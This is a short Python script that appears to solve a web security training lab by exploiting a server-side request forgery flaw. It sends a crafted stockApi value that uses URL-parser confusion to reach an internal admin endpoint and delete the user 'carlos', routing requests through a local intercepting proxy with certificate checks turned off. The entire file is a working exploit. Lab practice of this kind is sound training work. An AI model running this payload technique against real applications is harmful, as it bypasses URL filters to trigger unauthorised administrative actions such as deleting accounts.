import requests
import urllib3
from bs4 import BeautifulSoup
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def delete_carlos(url:str):
    body = {'stockApi': 'http://localhost%23@stock.weliketoshop.net/admin/delete?username=carlos'}
    r = requests.post(url + '/product/stock', data=body, verify=False, proxies=proxies, allow_redirects=False)
    if r.status_code == 302:
        print("Carlos Deleted Successfully")
        return True
    else:
        print("Failed To Delete Carlos")
        return False

def main():
    if len(sys.argv) != 2:
        print(f"Script Usage: {sys.argv[0]} <url>")
        print(f"Example: {sys.argv[0]} example.com")
        sys.exit(-1)
    
    url = sys.argv[1]
    if url.endswith('/'):
        url = url.removesuffix('/')

    if delete_carlos(url):
        print("Lab Solved!")
        sys.exit(0)
    else:
        sys.exit(-1)

if __name__ == '__main__':
    main()